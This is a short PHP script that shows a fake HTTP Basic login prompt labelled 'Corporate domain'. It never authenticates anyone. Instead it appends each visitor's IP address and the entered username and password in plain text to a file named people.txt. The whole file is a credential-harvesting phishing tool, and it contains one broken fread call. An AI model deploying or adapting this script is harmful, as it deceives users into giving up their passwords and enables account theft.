<?php

$now = new DateTime();

$user = isset($_SERVER['PHP_AUTH_USER']) ? $_SERVER['PHP_AUTH_USER'] : "";
$pass = isset($_SERVER['PHP_AUTH_PW'])   ? $_SERVER['PHP_AUTH_PW']   : "";

if ($user || $pass){
$fp = fopen("people.txt", "a");
$content = fread($fp);
$ip = $_SERVER["REMOTE_ADDR"];
fwrite($fp, $now->format("Y-m-d H:i:s") . "\t" . $ip . "\t" . $user . ":" . $pass . "\n");
fclose($fp);
}

header('WWW-Authenticate: Basic realm="Corporate domain"');

?>
